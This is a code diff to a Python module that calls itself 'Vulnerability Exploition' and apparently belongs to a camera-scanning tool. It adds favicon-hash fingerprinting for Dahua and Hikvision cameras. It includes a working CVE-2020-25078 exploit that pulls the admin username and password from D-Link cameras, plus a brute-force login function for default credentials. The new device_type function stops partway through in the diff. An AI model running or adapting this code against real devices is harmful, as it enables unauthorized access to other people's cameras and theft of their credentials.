@@ -1,15 +1,28 @@
 """Vulnerability Exploition"""
 import os
 import sys
+import hashlib
 import requests
 
 CWD = os.path.dirname(__file__)
 sys.path.append(os.path.join(CWD, '..'))
+from utils.base import multi_thread
 from utils.net import get_user_agent
-from utils.camera import snapshot_cve_2017_7921, snapshot_rtsp
 
 
 timeout=2
+
+
+def device_type(ip: str) -> list:
+    """Check whether the ip is a web camera"""
+    dev_hash = {
+        '4ff53be6165e430af41d782e00207fda': 'Dahua',
+        '89b932fcc47cf4ca3faadb0cfdef89cf': 'Hikvision',
+    }
+    url_list = [
+        f"http://{ip}/favicon.ico",  # hikvision, Luma
+        f"http://{ip}/image/lgbg.jpg",  # Dahua
+    ]
 
 
 def cve_2021_36260(ip: str) -> list:
@@ -124,13 +137,26 @@ def cve_2021_33044(ip: str) -> list:
 
 
 def cve_2020_25078(ip: str) -> list:
-    """(DLink) Brute"""
+    """(DLink) Disclosure of sensitive information"""
     headers = {'User-Agent': get_user_agent()}
     r = requests.get(f"http://{ip}/config/getuser?index=0", timeout=timeout, verify=False, headers=headers)
     if r.status_code == 200 and "name" in r.text and "pass" in r.text and "priv" in r.text and 'html' not in r.text:
         items = r.text.split()
         user, passwd = items[0].split('=')[1], items[1].split('=')[1]
         return [True, str(user), str(passwd), 'DLink', 'cve-2020-25078']
+    return [False, ]
+
+
+# bug!!!
+def dlink_weak(ip: str, users: list=['admin'], passwords: list=['']) -> list:
+    """(DLink) Brute"""
+    passwords = set(passwords + [''])
+    headers = {'User-Agent': get_user_agent()}
+    for user in users:
+        for p in passwords:
+            r = requests.get(f"http://{ip}", verify=False, headers=headers, timeout=timeout, auth=(user, p))
+            if r.status_code == 200 and 'D-Link' in r.text:
+                return [True, str(user), str(p), 'DLink', 'weak pass']
     return [False, ]
 
 
